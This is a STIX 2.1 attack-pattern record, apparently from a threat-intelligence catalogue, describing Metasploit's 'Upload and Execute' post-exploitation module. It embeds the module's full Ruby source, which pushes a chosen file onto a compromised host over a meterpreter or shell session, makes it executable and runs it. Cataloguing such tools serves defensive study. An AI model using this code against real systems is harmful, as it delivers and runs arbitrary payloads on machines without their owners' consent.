{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f6e3bce1-9620-4f8d-b647-08f8bfa3ba0c",
    "created": "2024-08-14T16:33:17.998572Z",
    "modified": "2024-08-14T16:33:17.998576Z",
    "name": "Upload and Execute",
    "description": "Push a file and execute it.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/multi/manage/upload_exec.rb",
            "external_id": "upload_exec.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Upload and Execute',\n        'Description' => %q{Push a file and execute it.},\n        'Author' => 'egypt',\n        'License' => MSF_LICENSE,\n        'Platform' => ['win', 'unix', 'linux', 'osx', 'bsd', 'solaris'],\n        'SessionTypes' => ['meterpreter', 'shell']\n      )\n    )\n\n    register_options([\n      OptPath.new('LPATH', [true, 'Local file path to upload and execute']),\n      OptString.new('RPATH', [false, 'Remote file path on target (default is basename of LPATH)']),\n      OptString.new('ARGS', [false, 'Command-line arguments to pass to the uploaded file']),\n      OptInt.new('TIMEOUT', [true, 'Timeout for command execution', 60])\n    ])\n  end\n\n  def run\n    print_status(\"Uploading #{lpath} to #{rpath}\")\n    upload_file(rpath, lpath)\n    register_file_for_cleanup(rpath)\n\n    if session.platform == 'windows'\n      # Don't use cmd.exe /c start so we can fetch output\n      cmd = rpath\n    else\n      # Set 700 so only we can execute the file\n      chmod(rpath, 0o700)\n\n      # Handle absolute paths\n      cmd = rpath.start_with?('/') ? rpath : \"./#{rpath}\"\n    end\n\n    print_status(\"Executing command: #{cmd}\")\n    output = cmd_exec(cmd, args, timeout)\n\n    if output.blank?\n      print_status('Command returned no output')\n    else\n      print_line(output)\n    end\n  end\n\n  def lpath\n    datastore['LPATH']\n  end\n\n  def rpath\n    datastore['RPATH'].blank? ? File.basename(lpath) : datastore['RPATH']\n  end\n\n  def args\n    datastore['ARGS']\n  end\n\n  def timeout\n    datastore['TIMEOUT']\n  end\nend\n",
    "x_mitre_platforms": [
        "['win', 'unix', 'linux', 'osx', 'bsd', 'solaris']"
    ]
}